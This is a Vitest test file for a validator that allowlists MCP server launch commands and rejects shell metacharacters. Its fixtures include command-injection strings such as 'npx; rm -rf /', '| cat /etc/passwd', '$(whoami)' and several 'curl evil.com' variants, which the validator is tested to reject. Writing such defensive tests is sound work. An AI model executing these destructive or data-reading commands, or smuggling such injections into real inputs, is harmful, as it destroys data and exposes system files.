import { test, expect, describe } from 'vitest';
import { validateMcpCommand, isAllowedCommand, containsShellMetacharacters } from './mcpCommandValidator';

// ── isAllowedCommand ─────────────────────────────────────────────

describe('isAllowedCommand', () => {
  test('accepts common runtime commands', () => {
    for (const cmd of ['node', 'npx', 'npm', 'python3', 'uvx', 'docker', 'deno', 'bun']) {
      expect(isAllowedCommand(cmd)).toBe(true);
    }
  });

  test('accepts Windows variants', () => {
    for (const cmd of ['node.exe', 'npx.cmd', 'npm.cmd', 'python.exe', 'docker.exe']) {
      expect(isAllowedCommand(cmd)).toBe(true);
    }
  });

  test('accepts absolute paths to allowed commands', () => {
    expect(isAllowedCommand('/usr/local/bin/node')).toBe(true);
    expect(isAllowedCommand('/usr/bin/python3')).toBe(true);
  });

  test('accepts Windows-style paths to allowed commands', () => {
    // On Windows, path.basename handles backslash as separator
    // On macOS/Linux, backslash is literal — so the basename is the full string
    // We only test forward-slash here (cross-platform safe)
    expect(isAllowedCommand('C:/Program Files/nodejs/npx.cmd')).toBe(true);
  });

  test('rejects unknown commands', () => {
    expect(isAllowedCommand('bash')).toBe(false);
    expect(isAllowedCommand('/bin/sh')).toBe(false);
    expect(isAllowedCommand('curl')).toBe(false);
    expect(isAllowedCommand('rm')).toBe(false);
    expect(isAllowedCommand('cat')).toBe(false);
    expect(isAllowedCommand('/usr/local/bin/my-mcp-server')).toBe(false);
  });
});

// ── containsShellMetacharacters ──────────────────────────────────

describe('containsShellMetacharacters', () => {
  test('returns false for clean inputs', () => {
    expect(containsShellMetacharacters('npx', ['-y', '@modelcontextprotocol/server-github'])).toBe(false);
    expect(containsShellMetacharacters('node', ['server.js'])).toBe(false);
  });

  test('detects semicolon in command', () => {
    expect(containsShellMetacharacters('npx; rm -rf /', [])).toBe(true);
  });

  test('detects pipe in args', () => {
    expect(containsShellMetacharacters('npx', ['-y', 'foo | cat /etc/passwd'])).toBe(true);
  });

  test('detects backtick in command', () => {
    expect(containsShellMetacharacters('`curl evil.com`', [])).toBe(true);
  });

  test('detects dollar sign in args', () => {
    expect(containsShellMetacharacters('node', ['$(whoami)'])).toBe(true);
  });

  test('detects ampersand in command', () => {
    expect(containsShellMetacharacters('npx && curl evil.com', [])).toBe(true);
  });

  test('detects newline in args', () => {
    expect(containsShellMetacharacters('node', ['server.js\ncurl evil.com'])).toBe(true);
  });
});

// ── validateMcpCommand ───────────────────────────────────────────

describe('validateMcpCommand', () => {
  // -- Empty / missing command --
  test('rejects empty command', () => {
    const result = validateMcpCommand('', []);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('required');
  });

  test('rejects undefined command', () => {
    const result = validateMcpCommand(undefined, []);
    expect(result.valid).toBe(false);
  });

  test('rejects whitespace-only command', () => {
    const result = validateMcpCommand('   ', []);
    expect(result.valid).toBe(false);
  });

  // -- Allowlisted commands pass without confirmation --
  test('allows npx without confirmation', () => {
    const result = validateMcpCommand('npx', ['-y', 'tavily-mcp@latest']);
    expect(result.valid).toBe(true);
    expect(result.needsConfirmation).toBe(false);
    expect(result.sanitizedCommand).toBe('npx');
  });

  test('allows node with absolute path', () => {
    const result = validateMcpCommand('/usr/local/bin/node', ['server.js']);
    expect(result.valid).toBe(true);
    expect(result.needsConfirmation).toBe(false);
  });

  test('allows python3', () => {
    const result = validateMcpCommand('python3', ['-m', 'mcp_server']);
    expect(result.valid).toBe(true);
    expect(result.needsConfirmation).toBe(false);
  });

  // -- Non-allowlisted commands: manual creation needs confirmation --
  test('unknown command needs confirmation (not built-in)', () => {
    const result = validateMcpCommand('/usr/local/bin/my-mcp-server', []);
    expect(result.valid).toBe(true);
    expect(result.needsConfirmation).toBe(true);
    expect(result.sanitizedCommand).toBe('/usr/local/bin/my-mcp-server');
  });

  test('unknown command rejected for built-in servers', () => {
    const result = validateMcpCommand('/usr/local/bin/my-mcp-server', [], true);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('not recognized');
  });

  // -- Shell metacharacters always rejected --
  test('rejects command with semicolon', () => {
    const result = validateMcpCommand('npx; rm -rf /', []);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('disallowed');
  });

  test('rejects command with pipe', () => {
    const result = validateMcpCommand('npx | cat /etc/passwd', []);
    expect(result.valid).toBe(false);
  });

  test('rejects command with backtick', () => {
    const result = validateMcpCommand('`curl evil.com`', []);
    expect(result.valid).toBe(false);
  });

  test('rejects command with dollar expansion', () => {
    const result = validateMcpCommand('$(whoami)', []);
    expect(result.valid).toBe(false);
  });

  test('rejects args with metacharacters', () => {
    const result = validateMcpCommand('npx', ['-y', 'pkg; curl evil.com']);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Argument');
  });

  test('rejects command with ampersand', () => {
    const result = validateMcpCommand('npx && curl evil.com', []);
    expect(result.valid).toBe(false);
  });

  test('rejects command with newline', () => {
    const result = validateMcpCommand('npx\ncurl evil.com', []);
    expect(result.valid).toBe(false);
  });

  // -- Trimming --
  test('trims whitespace from command', () => {
    const result = validateMcpCommand('  npx  ', ['-y', 'pkg']);
    expect(result.valid).toBe(true);
    expect(result.sanitizedCommand).toBe('npx');
  });

  // -- Built-in with allowed command passes --
  test('built-in with npx passes', () => {
    const result = validateMcpCommand('npx', ['-y', 'tavily-mcp@latest'], true);
    expect(result.valid).toBe(true);
    expect(result.needsConfirmation).toBe(false);
  });
});
